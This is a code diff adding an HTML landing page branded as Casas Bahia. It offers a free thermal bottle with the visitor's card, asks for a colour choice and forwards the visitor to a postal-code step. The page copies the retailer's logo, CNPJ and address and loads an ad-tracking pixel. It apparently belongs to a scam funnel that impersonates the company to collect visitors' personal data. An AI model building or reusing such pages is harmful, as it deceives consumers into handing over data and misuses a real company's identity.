@@ -1,0 +1,284 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Brinde Especial - Casas Bahia</title>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+    window.pixelId = "680465d10b6ade7f0dfbd4ab";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e3f2fd 100%);
+            text-align: center;
+            color: #333;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-bottom: 1px solid #e3e8ef;
+        }
+        .logo {
+            width: 160px;
+            height: auto;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #1976d2;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .color-options {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .color-option {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        .color-option:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+        }
+        .color-option.selected {
+            border-color: #1976d2;
+            box-shadow: 0 0 0 2px rgba(25, 118, 210, 0.3);
+        }
+        .card {
+            background: linear-gradient(45deg, #1976d2, #0d47a1);
+            border-radius: 15px;
+            padding: 20px;
+            height: 165px;
+            position: relative;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 32px rgba(25, 118, 210, 0.3);
+        }
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 100px;
+        }
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        .card-name {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            color: white;
+            font-weight: 600;
+        }
+        .continue-btn {
+            background: linear-gradient(135deg, #1976d2 0%, #0d47a1 100%);
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(25, 118, 210, 0.3);
+        }
+        .continue-btn:hover {
+            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(25, 118, 210, 0.4);
+        }
+        .button {
+            background: linear-gradient(135deg, #1976d2 0%, #0d47a1 100%);
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(25, 118, 210, 0.3);
+        }
+        .button:hover {
+            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(25, 118, 210, 0.4);
+        }
+        .color-selected {
+            font-weight: 600;
+            color: #1976d2;
+            margin: 20px 0;
+            font-size: 16px;
+        }
+        .gift-note {
+            background: linear-gradient(135deg, #e3f2fd 0%, #f3f9ff 100%);
+            border: 2px solid #1976d2;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            text-align: left;
+        }
+        .gift-icon {
+            color: #1976d2;
+            font-size: 24px;
+            margin-top: 2px;
+        }
+        .gift-text {
+            color: #1976d2;
+            font-size: 14px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        .footer {
+            background: #1976d2;
+            color: white;
+            padding: 20px 15px;
+            text-align: center;
+            margin-top: 50px;
+            font-family: 'Inter', sans-serif;
+        }
+        .footer p {
+            margin: 5px 0;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="../images/logo.svg" alt="Logo Casas Bahia" class="logo">
+    </div>
+
+    <div class="container">
+        <h1 style="text-align: center; font-size: 17px;">Para começarmos bem nossa relação ☺️</h1>
+        <p style="text-align: center; font-size: 13px; color: #666; margin-bottom: 30px;">Como presente de Boas-Vindas, vamos te enviar de graça junto do seu cartão uma Garrafa Térmica de 1,2L. Escolha a cor da sua:</p>
+
+        <div class="color-options">
+            <div class="color-option selected" style="background: #000000" onclick="changeBottleColor('Preto')"></div>
+            <div class="color-option" style="background: #FFB6C1" onclick="changeBottleColor('Rosa')"></div>
+            <div class="color-option" style="background: #ececec" onclick="changeBottleColor('Branco')"></div>
+        </div>
+
+        <p>Cor escolhida: <span id="selectedColor" class="color-selected"></span></p>
+
+        <script>
+            function changeBottleColor(color) {
+                // Atualiza a seleção visual
+                document.querySelectorAll('.color-option').forEach(option => {
+                    option.classList.remove('selected');
+                });
+                event.target.classList.add('selected');
+
+                // Atualiza o texto da cor selecionada
+                document.getElementById('selectedColor').textContent = color;
+
+                // Salva a cor selecionada no localStorage
+                localStorage.setItem('bottleColor', color);
+            }
+
+            // Carrega a cor salva ao iniciar a página
+            window.addEventListener('load', () => {
+                const savedColor = localStorage.getItem('bottleColor');
+                if (savedColor) {
+                    document.getElementById('selectedColor').textContent = savedColor;
+                    // Seleciona visualmente a cor salva
+                    document.querySelectorAll('.color-option').forEach(option => {
+                        if (option.getAttribute('onclick').includes(savedColor)) {
+                            option.classList.add('selected');
+                        }
+                    });
+                } else {
+                    // Define Preto como cor padrão
+                    document.getElementById('selectedColor').textContent = 'Preto';
+                }
+            });
+        </script>
+
+        <img src="images/garrafas.png" alt="Brinde" style="width: 100%; margin-bottom: 30px; border-radius: 15px;">
+
+        <div style="background-color: #fff9e6; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px solid #ffe0b2; display: flex; align-items: flex-start; gap: 12px; margin-top: -20px;" class="gift-note">
+            <div class="gift-icon"><i class="fas fa-gift"></i></div>
+            <div>
+                <div class="gift-text">Esse brinde especial é um presente para nossos clientes, queremos que nossa boa relação dure anos. Obrigado por ser um cliente exemplar! 😊</div>
+            </div>
+        </div>
+
+        <button onclick="window.location.href = buildUrlWithParams('../cep/index.html')" class="button">
+            Continuar
+        </button>
+
+        <footer class="footer">
+            <div style="max-width: 600px; margin: 0 auto;">
+                <p style="font-size: 11px; margin-bottom: 5px; line-height: 1.2;">
+                    Casas Bahia | CNPJ: 59.291.534/0001-43
+                </p>
+                <p style="font-size: 11px; margin-bottom: 5px; line-height: 1.2;">
+                    Av. das Nações Unidas, 3003 - Bonfim, Osasco - SP
+                </p>
+                <p style="font-size: 10px; margin-top: 5px;">
+                    © 2025 - Todos os direitos reservados
+                </p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+            function getUrlParams() {
+                const params = {};
+                const queryString = window.location.search;
+                const urlParams = new URLSearchParams(queryString);
+                
+                for (const [key, value] of urlParams) {
+                    params[key] = value;
+                }
+                return params;
+            }
+
+            function buildUrlWithParams(baseUrl) {
+                const params = getUrlParams();
+                const url = new URL(baseUrl, window.location.href);
+                Object.keys(params).forEach(key => {
+                    url.searchParams.append(key, params[key]);
+                });
+                
+                return url.toString();
+            }
+    </script>
+
+
+</body></html>
